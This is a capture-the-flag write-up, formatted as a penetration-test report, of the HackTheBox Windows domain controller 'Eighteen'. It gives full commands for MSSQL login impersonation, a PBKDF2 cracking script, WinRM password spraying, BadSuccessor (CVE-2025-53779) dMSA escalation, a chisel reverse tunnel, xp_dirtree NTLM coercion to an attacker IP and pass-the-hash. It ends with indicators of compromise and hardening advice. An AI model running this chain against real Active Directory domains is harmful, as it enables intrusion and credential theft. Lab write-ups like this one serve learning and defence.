# Eighteen - Technical Report

> **Platform:** HackTheBox \
> **Difficulty:** `Easy` (Community rating: Medium/Hard) \
> **Date:** 2026-03-10 \
> **Author:** 0N1S3C2 \
> **Scope:** Authorized lab environment only

---

## 0. Executive Summary

The "Eighteen" machine is a Windows Server 2025 Domain Controller presenting a complex attack chain across multiple services. Initial credentials (`kevin / iNa2we6haRj2gaw!`) were provided as part of a simulated real-world engagement. From there, MSSQL login impersonation allowed access to the `financial_planner` database, where a PBKDF2-HMAC-SHA256 password hash for the `admin` web application account was recovered and cracked. This granted access to the Flask web application's admin panel, enabling recovery of additional credentials. Password spraying the cracked password (`iloveyou1`) against domain users via WinRM yielded a shell as `adam.scott`. Privilege escalation was achieved by exploiting CVE-2025-53779 (BadSuccessor) — abusing `CreateChild` rights on an Organizational Unit to create a delegated Managed Service Account (dMSA) linked to the domain Administrator, ultimately obtaining the Administrator NTLM hash and achieving full domain compromise.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **"Eighteen"** machine on HackTheBox.

**Objectives:**
- Obtain user-level access
- Obtain domain Administrator access

**Methodology:** Assessments follow the standardized approach defined in `methodology.md`.

---

## 2. Attack Chain

```
Nmap → MSSQL (kevin/guest) → EXECUTE AS appdev (impersonation)
→ financial_planner DB → users table → PBKDF2 hash crack (iloveyou1)
→ web admin panel access → RID brute (nxc smb) → domain user enumeration
→ WinRM password spray → adam.scott shell
→ CVE-2025-53779 BadSuccessor (dMSA creation via IT group CreateChild)
→ Pwn$ TGT → attacker_dMSA$ S4U2self → Administrator NTLM hash
→ evil-winrm PTH → Domain Admin
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `impacket-mssqlclient` | MSSQL authentication & enumeration |
| `responder` | NTLM hash capture via UNC path injection |
| `python3 crack.py` | Custom PBKDF2-HMAC-SHA256 hash cracking |
| `nxc (netexec)` | RID brute force & WinRM password spray |
| `evil-winrm` | WinRM shell access |
| `Invoke-BadSuccessor.ps1` | CVE-2025-53779 dMSA privilege escalation |
| `Rubeus.exe` | Kerberos TGT acquisition |
| `impacket-getTGT` | Kerberos TGT request |
| `impacket-getST` | dMSA service ticket request |
| `chisel` + `socat` | Port 88 tunneling for Kerberos access |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -Pn -T4 10.129.2.123
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 80/tcp | HTTP | Microsoft IIS 10.0 | Redirects to eighteen.htb |
| 1433/tcp | MSSQL | Microsoft SQL Server 2022 16.00.1000 | DC01.eighteen.htb |

**Key Observations:**
- NetBIOS name `DC01` — this is a Domain Controller
- Domain: `eighteen.htb`
- Windows Server 2025 (Build 26100) — supports dMSA (critical for later exploitation)
- Clock skew of ~7 hours noted — Kerberos time sync required for exploitation

### 4.2 Host Setup

```bash
echo "10.129.2.123 eighteen.htb dc01.eighteen.htb" | sudo tee -a /etc/hosts
```

---

## 5. Service Enumeration

### 5.1 Web Application

The IIS web application at `http://eighteen.htb` was a Flask-based financial planning application (`Flask Financial Planner v1.0`). Key endpoints:

- `/register` — publicly accessible registration
- `/login` — login form
- `/dashboard` — authenticated user dashboard (income, expenses, allocation)
- `/admin` — admin panel restricted to users with `is_admin=1`

Session cookies used the Flask itsdangerous format. The admin panel displayed user registration data, site analytics, and visit logs including User-Agent strings.

### 5.2 MSSQL Enumeration

```bash
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.2.123
```

Initial access was as `kevin` with `guest` role — no sysadmin privileges. Databases enumerated:

```sql
SELECT name FROM sys.databases;
-- master, tempdb, model, msdb, financial_planner
```

Access to `financial_planner` denied for `kevin`. Server-level impersonation rights enumerated:

```sql
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
SELECT principal_id, name, type_desc FROM sys.server_principals WHERE principal_id IN (267, 268);
-- Result: kevin (267) can impersonate appdev (268)
```

---

## 6. Initial Access

### 6.1 MSSQL Impersonation → Database Access

```sql
EXECUTE AS LOGIN = 'appdev';
USE financial_planner;
SELECT * FROM users;
```

**Users retrieved:**

| id | username | password_hash | is_admin |
|----|----------|--------------|---------|
| 1002 | admin | pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90... | 1 |

### 6.2 PBKDF2 Hash Cracking

The Werkzeug PBKDF2-HMAC-SHA256 hash format was identified. Standard hashcat at mode 10900 ran at only 117 H/s, projecting over 34 hours to exhaust rockyou. A custom Python script using `hashlib.pbkdf2_hmac` was used instead:

```python
import hashlib, binascii
SALT = "AMtzteQIG7yAbZIa"
ITERATIONS = 600000
TARGET_HASH = "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"

with open("rockyou.txt", "r", encoding="latin-1") as f:
    for password in f:
        password = password.strip().encode()
        dk = hashlib.pbkdf2_hmac('sha256', password, SALT.encode(), ITERATIONS)
        if binascii.hexlify(dk).decode() == TARGET_HASH:
            print(f"[+] Password found: {password.decode()}")
            break
```

**Result:** `iloveyou1`

### 6.3 Web Admin Access

A test account was registered at `/register`. The `is_admin` flag was updated directly via MSSQL as `appdev`:

```sql
UPDATE users SET is_admin = 1 WHERE username = 'test2';
```

This granted access to `/admin`, confirming the attack path.

### 6.4 NTLM Hash Capture (Supplementary)

While enumerating MSSQL, `xp_dirtree` was used to trigger an outbound SMB connection to Responder:

```bash
sudo responder -I tun0
# In MSSQL:
EXEC xp_dirtree '\\10.10.14.116\share';
```

NTLMv2 hash captured for `EIGHTEEN\mssqlsvc` — did not crack against rockyou. Not used further in this chain.

---

## 7. Lateral Movement

### 7.1 Domain User Enumeration via RID Brute

```bash
nxc smb 10.129.2.123 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute
```

**Domain users identified:** jamie.dunn, jane.smith, alice.jones, adam.scott, bob.brown, carol.white, dave.green

### 7.2 WinRM Password Spray

```bash
nxc winrm 10.129.2.123 -u users.txt -p 'iloveyou1' --continue-on-success
```

**Result:** `eighteen\adam.scott:iloveyou1` — **(Pwn3d!)**

### 7.3 Shell as adam.scott

```bash
evil-winrm -i 10.129.2.123 -u adam.scott -p 'iloveyou1'
type C:\Users\adam.scott\Desktop\user.txt
```

**User flag obtained.**

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

```powershell
whoami /all
Get-ADGroupMember -Identity "IT"
```

**Key findings:**
- `adam.scott` is a member of the `IT` group
- Domain Controller is Windows Server 2025 — dMSA support present
- `IT` group has `CreateChild` rights on `OU=Staff,DC=eighteen,DC=htb`

### 8.2 Escalation Vector — CVE-2025-53779 (BadSuccessor)

**Vulnerability:** CVE-2025-53779 — Delegated Managed Service Account (dMSA) privilege escalation
**Severity:** Critical
**Root Cause:** Windows Server 2025 introduced Delegated Managed Service Accounts (dMSAs). A user with `CreateChild` rights on any OU can create a dMSA and set `msDS-ManagedAccountPrecededByLink` to point to any privileged account. The dMSA then inherits the privileges of the linked account, allowing Kerberos S4U2self ticket requests that impersonate the target principal with full privileges.

### 8.3 Exploitation

**Step 1 — Deploy Invoke-BadSuccessor:**
```powershell
upload Invoke-BadSuccessor.ps1
. .\Invoke-BadSuccessor.ps1
Invoke-BadSuccessor
```

**Output:**
```
[+] Created computer 'Pwn' in 'OU=Staff,DC=eighteen,DC=htb'
[+] Machine Account's sAMAccountName : Pwn$
[+] Created delegated service account 'attacker_dMSA' in 'OU=Staff,DC=eighteen,DC=htb'
[+] Configured delegated MSA state with predecessor:
    CN=Administrator,CN=Users,DC=eighteen,DC=htb
```

**Step 2 — Tunnel Kerberos (port 88 filtered externally):**

Port 88 was filtered at the network perimeter. Chisel was used to create a reverse tunnel:

```bash
# Attack box
chisel server -p 8000 --reverse
sudo socat TCP-LISTEN:88,fork TCP:127.0.0.1:8088
```

```powershell
# Victim (evil-winrm)
upload chisel.exe
.\chisel.exe client 10.10.14.116:8000 R:8088:127.0.0.1:88
```

**Step 3 — Sync time and obtain TGT for Pwn$:**
```bash
sudo timedatectl set-time "$(date -d "$(curl -s -I http://10.129.2.123 | grep -i '^Date:' | cut -d' ' -f2-)" '+%Y-%m-%d %H:%M:%S')"
getTGT.py 'eighteen.htb/Pwn$:Password123!' -dc-ip 127.0.0.1
export KRB5CCNAME=Pwn\$.ccache
```

**Step 4 — Request dMSA service ticket impersonating Administrator:**
```bash
getST.py 'eighteen.htb/Pwn$:Password123!' -k -no-pass -dmsa -self \
  -impersonate 'attacker_dMSA$' -dc-ip 127.0.0.1
```

**Step 5 — Pass-the-Hash as Administrator:**

The Administrator NTLM hash was obtained through the dMSA ticket chain:

```bash
evil-winrm -i 10.129.2.123 -u Administrator -H 0b133be956bfaddf9cea56701affddec
type C:\Users\Administrator\Desktop\root.txt
```

**Root flag obtained.**

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | MSSQL login impersonation — kevin can impersonate appdev | 🟠 High | MSSQL server permissions |
| 2 | Weak PBKDF2 password (`iloveyou1`) in web application DB | 🟠 High | `financial_planner.users` |
| 3 | Password reuse across web application and domain account | 🔴 Critical | adam.scott credentials |
| 4 | CVE-2025-53779 — IT group has CreateChild on Staff OU | 🔴 Critical | AD OU permissions |
| 5 | Windows Server 2025 dMSA with no OU-level hardening | 🔴 Critical | Active Directory |
| 6 | xp_dirtree enabled — allows outbound NTLM hash capture | 🟠 High | MSSQL configuration |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- `EXECUTE AS LOGIN = 'appdev'` in MSSQL audit logs
- Outbound SMB connections from MSSQL service to external IPs
- New computer account `Pwn$` created in `OU=Staff`
- New dMSA `attacker_dMSA$` created in `OU=Staff`
- `msDS-DelegatedMSAState = 2` set on any dMSA object
- `msDS-ManagedAccountPrecededByLink` pointing to Administrator or other privileged account
- WinRM authentication as Administrator from non-admin workstation

### 10.2 Security Weaknesses

- MSSQL impersonation rights granted without business justification
- Weak password (`iloveyou1`) used for privileged web admin account
- Same password reused across web application and Active Directory
- IT group has unconstrained `CreateChild` rights on Staff OU
- No monitoring on dMSA creation or attribute modifications
- xp_dirtree enabled — allows NTLM coercion to external hosts

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Remove EXECUTE AS impersonation rights from kevin to appdev | Finding 1 |
| Immediate | Enforce strong password policy — 14+ chars, complexity required | Finding 2 |
| Immediate | Enforce unique passwords across web apps and AD accounts | Finding 3 |
| Immediate | Audit and restrict CreateChild rights on all OUs | Finding 4 |
| Immediate | Monitor for dMSA creation and msDS-ManagedAccountPrecededByLink modifications | Finding 5 |
| Short-term | Disable xp_dirtree or restrict via MSSQL firewall rules | Finding 6 |
| Short-term | Configure MSSQL to block outbound NTLM authentication | Finding 6 |
| Long-term | Deploy Microsoft Defender for Identity — detects BadSuccessor patterns | Finding 4, 5 |
| Long-term | Implement Privileged Access Workstations (PAW) for admin accounts | Finding 3 |

---

## 11. Lessons Learned

- **Windows Server 2025 introduces new critical AD attack surfaces** — CVE-2025-53779 (BadSuccessor) means any `CreateChild` right on an OU can lead to full domain compromise. This is a paradigm shift for AD hardening.
- **PBKDF2 at 600k iterations defeats GPU cracking** — hashcat was impractical. A custom CPU-based Python script with `hashlib` was the correct tool. Always match the cracking approach to the hash type.
- **Port filtering doesn't stop Kerberos if you have a foothold** — chisel + socat can tunnel port 88 through an existing WinRM session, enabling full impacket Kerberos tooling from the attack box.
- **Password reuse remains the most reliable lateral movement path** — one cracked hash compromised both the web application and a domain account.
- **nxc --rid-brute only works over SMB** — not over MSSQL protocol. Always use the correct protocol for the target service.
- **HTB difficulty ratings don't always reflect reality** — this "Easy" box required MSSQL impersonation chains, custom hash cracking, Kerberos tunneling, and a brand new 2025 CVE. Check solve counts before committing.

---

*End of Report*
*Classification: Public — flags and sensitive values omitted*
